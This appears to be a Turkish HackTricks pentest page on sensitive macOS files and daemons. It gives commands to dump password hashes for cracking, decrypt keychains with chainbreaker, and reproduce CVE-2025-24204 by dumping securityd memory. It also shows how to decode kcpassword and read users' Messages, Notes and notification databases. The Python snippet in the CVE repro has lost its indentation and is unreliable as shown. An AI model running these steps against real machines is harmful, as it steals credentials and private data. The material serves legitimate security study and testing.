# macOS Hassas Konumlar ve İlginç Daemon'lar

{{#include ../../../banners/hacktricks-training.md}}

## Parolalar

### Shadow Passwords

Shadow password, **`/var/db/dslocal/nodes/Default/users/`** konumunda bulunan plist'lerde kullanıcının yapılandırmasıyla birlikte saklanır.\
Aşağıdaki oneliner, **kullanıcılar hakkındaki tüm bilgileri** (hash bilgileri dahil) dump etmek için kullanılabilir:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Bu gibi script'ler**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) veya [**bu script**](https://github.com/octomagon/davegrohl.git), hash'i **hashcat** **formatına** dönüştürmek için kullanılabilir.

macOS PBKDF2-SHA512 için `-m 7100` **formatında** tüm non-service account'ların credential'larını dump edecek alternatif bir one-liner:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Bir kullanıcının `ShadowHashData` değerini elde etmenin başka bir yolu da `dscl` kullanmaktır: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Bu dosya yalnızca sistem **single-user mode**'da çalışırken **kullanılır** (dolayısıyla çok sık kullanılmaz).

### Keychain Dump

Parolaları **şifreleri çözülmüş olarak dump etmek** için `security` binary'si kullanıldığında, kullanıcıdan bu işleme izin vermesini isteyen birkaç istem görüntülenir.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Modern macOS'ta en ilgi çekici backing store'lar genellikle **`~/Library/Keychains/login.keychain-db`** ve **`/Library/Keychains/System.keychain`** konumlarında bulunur. Bunlar SQLite tabanlı dosyalardır; ancak plaintext erişimi hâlâ **`securityd`** tarafından sağlanır: ham DB'yi ele geçirmek, kullanıcının parolasını, `SystemKey`'i veya bellekteki bir master key'i de kurtarmadığınız sürece size çoğunlukla metadata ve encrypted blob'lar sağlar.<sup>[2]</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Bu yoruma [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) dayanarak, bu araçların Big Sur'da artık çalışmadığı görülüyor.

### Keychaindump Genel Bakış

macOS keychain'lerinden parolaları çıkarmak için **keychaindump** adlı bir araç geliştirilmiştir; ancak [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)'da belirtildiği üzere Big Sur gibi daha yeni macOS sürümlerinde sınırlamalarla karşılaşır. **keychaindump** kullanmak, saldırganın erişim elde etmesini ve ayrıcalıkları **root** seviyesine yükseltmesini gerektirir. Araç, kolaylık amacıyla kullanıcı login olduğunda keychain'in varsayılan olarak unlocked olması ve uygulamaların kullanıcının parolasını tekrar tekrar istemeden keychain'e erişebilmesi gerçeğinden yararlanır. Ancak kullanıcı keychain'ini her kullanımdan sonra lock etmeyi seçerse **keychaindump** etkisiz hâle gelir.

**Keychaindump**, Apple tarafından authorization ve cryptographic işlemler için kullanılan ve keychain'e erişim açısından kritik bir daemon olarak tanımlanan **securityd** adlı belirli bir process'i hedef alarak çalışır. Extraction süreci, kullanıcının login parolasından türetilen bir **Master Key**'i tanımlamayı içerir. Bu key, keychain dosyasını okumak için gereklidir. **Master Key**'i bulmak için **keychaindump**, `vmmap` komutunu kullanarak **securityd**'nin memory heap'ini tarar ve `MALLOC_TINY` olarak işaretlenmiş alanlarda olası key'leri arar. Bu memory konumlarını incelemek için aşağıdaki komut kullanılır:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Potansiyel master keys belirlendikten sonra **keychaindump**, master key adayı olduğunu gösteren belirli bir pattern'i (`0x0000000000000018`) bulmak için heap'leri tarar. Bu key'i kullanabilmek için **keychaindump**'ın source code'unda açıklandığı üzere deobfuscation dahil olmak üzere ek adımlar gerekir. Bu alana odaklanan analistler, keychain'in şifresini çözmek için gereken kritik verilerin **securityd** process'inin belleğinde depolandığını unutmamalıdır. **keychaindump** çalıştırmak için örnek command:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker), bir OSX keychain'inden aşağıdaki bilgi türlerini adli bilişim açısından güvenilir bir şekilde çıkarmak için kullanılabilir:

- [hashcat](https://hashcat.net/hashcat/) veya [John the Ripper](https://www.openwall.com/john/) ile kırılmaya uygun, hash'lenmiş Keychain parolası
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Keychain unlock password, [volafox](https://github.com/n0fate/volafox) veya [volatility](https://github.com/volatilityfoundation/volatility) kullanılarak elde edilmiş bir master key ya da SystemKey gibi bir unlock file verildiğinde Chainbreaker, düz metin parolaları da sağlar.

Keychain'i açmak için bu yöntemlerden biri kullanılmadığında Chainbreaker, mevcut diğer tüm bilgileri görüntüler.

#### **Keychain anahtarlarını dök**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey ile anahtar zinciri anahtarlarını (parolalarla birlikte) dump edin**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Hash'i crack ederek keychain anahtarlarını (parolalarla) dump et**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) with memory dump**

**memory dump** gerçekleştirmek için [bu adımları izleyin](../index.html#dumping-memory-with-osxpmem)
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Kullanıcı parolasını kullanarak keychain anahtarlarını (parolalarla birlikte) dump edin**

Kullanıcının parolasını biliyorsanız, bunu **kullanıcıya ait keychain'leri dump etmek ve şifrelerini çözmek** için kullanabilirsiniz.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### `gcore` entitlement üzerinden Keychain master key (CVE-2025-24204)

macOS 15.0 (Sequoia), **`com.apple.system-task-ports.read`** entitlement'ına sahip `/usr/bin/gcore` ile yayımlandı; bu nedenle herhangi bir local admin (veya kötü amaçlı imzalı bir uygulama), SIP/TCC uygulanıyor olsa bile **herhangi bir process memory** dökümünü alabiliyordu. `securityd` dökümünün alınması, **Keychain master key** değerini açık şekilde sızdırır ve kullanıcı parolası olmadan `login.keychain-db` dosyasının şifresini çözmenizi sağlar.<sup>[1]</sup>

**Güvenlik açığı bulunan build'lerde (15.0–15.2) hızlı repro:**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Çıkarılan hex key'i Chainbreaker'a (`--key <hex>`) vererek login keychain'in şifresini çözün. Apple, **macOS 15.3+** sürümlerinde entitlement'ı kaldırdı; bu nedenle bu işlem yalnızca patch uygulanmamış Sequoia build'lerinde veya güvenlik açığı bulunan binary'yi koruyan sistemlerde çalışır.

### kcpassword

**kcpassword** dosyası, yalnızca sistem sahibi **automatic login** özelliğini etkinleştirmişse **kullanıcının login password'ünü** içerir. Bu nedenle kullanıcıdan password istenmeden otomatik olarak login yapılır (bu pek güvenli değildir).

Password, **`/etc/kcpassword`** dosyasında **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** key'iyle XOR'lanmış olarak saklanır. Kullanıcının password'ü key'den uzunsa key yeniden kullanılır.\
Bu, password'ün kurtarılmasını oldukça kolaylaştırır; örneğin [**bu script**](https://gist.github.com/opshope/32f65875d45215c3677d) gibi script'ler kullanılabilir.

## Databases İçindeki İlginç Bilgiler

### Mesajlar
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Bildirimler

**Sequoia** öncesinde Notification Center store'u genellikle **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** konumunda bulabilirsiniz. **Sequoia+** sürümlerinde Apple bunu TCC-korumalı group container olan **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`** konumuna taşıdı.

İlginç bilgilerin çoğu **blob** sütunlarında saklanır; bu nedenle bu içeriği çıkarmanız ve insan tarafından okunabilir bir formata dönüştürmeniz gerekir (`plutil -p -`, `strings` veya küçük bir parser). Hızlı triage örnekleri:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Son gizlilik sorunları (NotificationCenter DB)

- macOS **14.7–15.1** sürümlerinde Apple, banner içeriğini uygun redaction uygulamadan `db2/db` SQLite veritabanında sakladı. **CVE-2024-44292/44293/40838/54504**, herhangi bir local user'ın DB'yi açarak diğer kullanıcıların notification metinlerini okumasına izin verdi (TCC prompt'u gerekmeden).
- Apple, daha yeni Sequoia build'lerinde DB'yi `group.com.apple.usernoted` içine taşıyıp TCC ile koruyarak bunu mitigate etti; bu nedenle güncel sistemlerde DB'yi okumak için genellikle doğru user context veya bir TCC bypass gerekir.<sup>[3]</sup>
- Legacy endpoint'lerde artefact'ları korumak istiyorsanız update veya reboot öncesinde `db`, `db-wal` ve `db-shm` dosyalarını birlikte kopyalayın.

### Notlar

Kullanıcıların **notları** `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` konumunda bulunabilir.
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Yukarıdaki one-liner fazla gürültülü sonuç veriyorsa `ZICNOTEDATA.ZDATA` öğesini export edin, gunzip ile açın ve protobuf'u parse edin: bu yöntem genellikle SQLite üzerinde doğrudan `strings` çalıştırmaktan daha güvenilirdir.

### Arka Plan Görevleri / Login Items

**Ventura**'dan beri kullanıcı tarafından onaylanan Login Items ve çeşitli arka plan görevleri, **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** gibi **BTM** store'larında ve sürümlendirilmiş sistem cache'i olan **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`** içinde takip edilir.

Bu dosyalar persistence'ı, helper tools'ları ve MDM tarafından yönetilen bazı arka plan öğelerini hızlıca tespit etmek için kullanışlıdır:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Persistence ve BTM internals açısından [auto-start locations sayfasına](../../macos-auto-start-locations.md#login-items) ve [Background Tasks Management notlarına](../macos-security-protections/README.md#background-tasks-management) bakın.

## Tercihler

macOS uygulamalarında tercihler **`$HOME/Library/Preferences`** konumunda, iOS'ta ise `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences` konumunda bulunur.

macOS'ta **`defaults`** cli aracı, **Preferences dosyasını değiştirmek** için kullanılabilir.

**`/usr/sbin/cfprefsd`**, `com.apple.cfprefsd.daemon` ve `com.apple.cfprefsd.agent` XPC services'lerini yönetir ve tercihleri değiştirme gibi işlemleri gerçekleştirmek için çağrılabilir.

## OpenDirectory permissions.plist

`/System/Library/OpenDirectory/permissions.plist` dosyası, node attributes üzerine uygulanan permissions bilgilerini içerir ve SIP tarafından korunur.\
Bu dosya, belirli hassas bilgilere erişebilmeleri için belirli kullanıcılara uid yerine UUID ile izin verir; bu bilgiler arasında `ShadowHashData`, `HeimdalSRPKey` ve `KerberosKeys` de bulunur:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## System Notifications

### Darwin Notifications

Bildirimler için ana daemon **`/usr/sbin/notifyd`**'dir. Bildirimleri almak için istemcilerin `com.apple.system.notification_center` Mach portu üzerinden kayıt olması gerekir (`sudo lsmp -p <pid notifyd>` ile kontrol edin). Daemon, `/etc/notify.conf` dosyasıyla yapılandırılabilir.

Bildirimler için kullanılan adlar benzersiz reverse DNS gösterimleridir ve bir bildirim bu adlardan birine gönderildiğinde, bunu işleyebileceğini belirten istemci(ler) bildirimi alır.

notifyd process'ine SIGUSR2 sinyali gönderip oluşturulan dosyayı okuyarak mevcut durumu (ve tüm adları) dump etmek mümkündür: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

Ana binary'si **`/usr/sbin/distnoted`** olan **Distributed Notification Center**, notification göndermenin başka bir yoludur. Bazı XPC servislerini açığa çıkarır ve client'ları doğrulamayı denemek için bazı kontroller gerçekleştirir.

### Apple Push Notifications (APN)

Bu durumda uygulamalar **topics** için register olabilir. Client, **`apsd`** üzerinden Apple sunucularına bağlanarak bir token oluşturur.\
Ardından provider'lar da bir token oluşturmuş olur ve client'lara mesaj göndermek için Apple sunucularına bağlanabilir. Bu mesajlar yerel olarak **`apsd`** tarafından alınır ve notification'ı onu bekleyen uygulamaya iletir.

Preferences `/Library/Preferences/com.apple.apsd.plist` konumunda bulunur.

macOS'ta `/Library/Application\ Support/ApplePushService/aps.db`, iOS'ta ise `/var/mobile/Library/ApplePushService` konumunda yerel bir mesaj database'i bulunur. Bu database'de 3 tablo vardır: `incoming_messages`, `outgoing_messages` ve `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Daemon ve bağlantılar hakkında bilgi almak da mümkündür:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Kullanıcı Bildirimleri

Bunlar kullanıcının ekranda görmesi gereken bildirimlerdir:

- **`CFUserNotification`**: Bu API, ekranda bir mesaj içeren açılır pencere göstermenin bir yolunu sağlar.
- **The Bulletin Board**: iOS'ta görünen, kaybolan ve Notification Center'da depolanan bir banner gösterir.
- **`NSUserNotificationCenter`**: Bu, MacOS'taki iOS bulletin board'dur. Daha eski macOS sürümlerinde veritabanı genellikle `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db` konumunda bulunur; Sequoia+ sürümlerinde ise `~/Library/Group Containers/group.com.apple.usernoted/db2/db` konumuna taşınmıştır.

## Referanslar

- [1] [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
